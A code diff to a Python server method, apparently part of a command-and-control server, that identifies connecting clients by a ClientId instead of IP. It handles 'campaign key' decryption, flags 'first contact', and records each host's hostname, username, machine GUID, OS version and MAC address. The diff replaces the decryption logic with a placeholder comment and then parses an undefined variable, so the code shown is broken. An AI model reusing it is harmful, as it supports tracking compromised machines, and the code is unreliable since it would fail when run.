@@ -4,7 +4,7 @@ import logging
 from datetime import datetime
 from utils.client_identity import extract_system_info
 import hashlib
-
+import json
 
 logger = logging.getLogger(__name__)
 
@@ -18,88 +18,88 @@ class ClientHelper:
     
     def identify_client(self, client_ip, headers, system_info_raw=None):
         """
-        Identify a client based on IP address only
+        Identify a client based on unique client ID rather than IP
         
         Returns:
             tuple: (client_id, system_info, newly_identified, first_contact)
         """
-        # Use the client IP as the client ID
-        client_id = client_ip
         system_info = {}
         newly_identified = False
         first_contact = False
+        client_id = None  # No longer default to IP
         
-        # Check if this is a known client
-        if client_id in self.client_manager.get_clients_info():
-            logger.info(f"Recognized client by IP address {client_ip}")
-        else:
-            newly_identified = True
-            first_contact = True
-            logger.info(f"New client with IP address {client_ip}")
+        # Extract client ID from headers if available
+        client_id_header = headers.get('X-Client-ID')
         
         # Process system info if available
         if system_info_raw:
             try:
-                # Try to decrypt if encrypted, but handle unencrypted initial requests
-                try:
-                    # First try treating it as encrypted data with client's key if they're known
-                    if client_id in self.client_manager.get_clients_info() and not first_contact:
-                        try:
-                            system_info_json = self.crypto_helper.decrypt(system_info_raw, client_id)
-                        except:
-                            # Fall back to campaign key
-                            system_info_json = self.crypto_helper.crypto_manager.decrypt(system_info_raw)
-                    else:
-                        # For new clients, use campaign key
-                        system_info_json = self.crypto_helper.crypto_manager.decrypt(system_info_raw)
-                    logger.info(f"Successfully decrypted system info from {client_ip}")
-                except Exception as e:
-                    # If decryption fails, it might be the initial connection without encryption
-                    logger.info(f"Decryption failed, trying as unencrypted: {str(e)}")
-                    system_info_json = system_info_raw
-                    first_contact = True
+                # Try to decrypt system info (existing code...)
                 
-                # Extract key system properties
+                # Extract the ClientId from the system info
                 try:
-                    hostname, username, machine_guid, os_version, mac_address, system_info = extract_system_info(system_info_json)
+                    system_info_obj = json.loads(system_info_json)
+                    client_id = system_info_obj.get('ClientId')
+                    
+                    if not client_id and client_id_header:
+                        # Use header ID if not in system info
+                        client_id = client_id_header
+                        
+                    # Extract other properties...
+                    hostname = system_info_obj.get('Hostname', 'Unknown')
+                    username = system_info_obj.get('Username', 'Unknown')
+                    machine_guid = system_info_obj.get('MachineGuid', 'Unknown')
+                    os_version = system_info_obj.get('OsVersion', 'Unknown')
+                    mac_address = system_info_obj.get('MacAddress', 'Unknown')
+                    system_info = system_info_obj
                     
                     # Add IP to system info
                     system_info['ip'] = client_ip
                     
                 except Exception as e:
-                    logger.error(f"Error extracting system information: {str(e)}")
-                    # Create minimal system info
-                    system_info = {'ip': client_ip}
-                    hostname = "Unknown"
-                    username = "Unknown"
+                    logger.error(f"Error extracting client ID: {str(e)}")
+                    # If we can't get a client ID, use IP as fallback
+                    client_id = client_ip
                     
+                # Check if this is a known client
+                if client_id in self.client_manager.get_clients_info():
+                    logger.info(f"Recognized client by ID {client_id} from {client_ip}")
+                    
+                    # Update IP in case it changed
+                    client_info = self.client_manager.get_clients_info()[client_id]
+                    if client_info.get('ip') != client_ip:
+                        logger.info(f"Client {client_id} IP changed from {client_info.get('ip')} to {client_ip}")
+                        
+                    # Check if this client needs a key
+                    if not self._has_unique_key(client_id):
+                        first_contact = True
+                else:
+                    newly_identified = True
+                    first_contact = True
+                    logger.info(f"New client with ID {client_id} from {client_ip}")
+                
                 # Register or update the client
                 self.client_manager.add_client(
                     ip=client_ip, 
-                    hostname=hostname if 'hostname' in locals() else "Unknown",
-                    username=username if 'username' in locals() else "Unknown",
-                    machine_guid="Unknown",
-                    os_version="Unknown",
-                    mac_address="Unknown",
+                    hostname=hostname,
+                    username=username,
+                    machine_guid=machine_guid,
+                    os_version=os_version,
+                    mac_address=mac_address,
                     system_info=system_info,
-                    existing_id=client_id
+                    client_id=client_id  # Pass client ID to add_client
                 )
-                
+                    
             except Exception as e:
                 logger.error(f"Error processing system information: {str(e)}")
-                # Ensure client is registered with minimal info
-                self.client_manager.add_client(ip=client_ip, existing_id=client_id)
+                # Fallback to IP-based ID
+                client_id = client_ip
+                self.client_manager.add_client(ip=client_ip, client_id=client_id)
         else:
-            # No system info, just register with IP
-            self.client_manager.add_client(ip=client_ip, existing_id=client_id)
+            # No system info, fall back to ID from header or IP
+            client_id = client_id_header if client_id_header else client_ip
+            self.client_manager.add_client(ip=client_ip, client_id=client_id)
         
-        # First contact check - if client exists but doesn't have a unique key, mark as first contact
-        if not first_contact and client_id in self.client_manager.get_clients_info():
-            if not self._has_unique_key(client_id):
-                first_contact = True
-        
-        hostname_display = system_info.get('hostname', "Unknown")
-        logger.info(f"Client identified as {client_id} ({hostname_display}){' - FIRST CONTACT' if first_contact else ''}")
         return client_id, system_info, newly_identified, first_contact
 
     def verify_client(self, client_id, system_info):
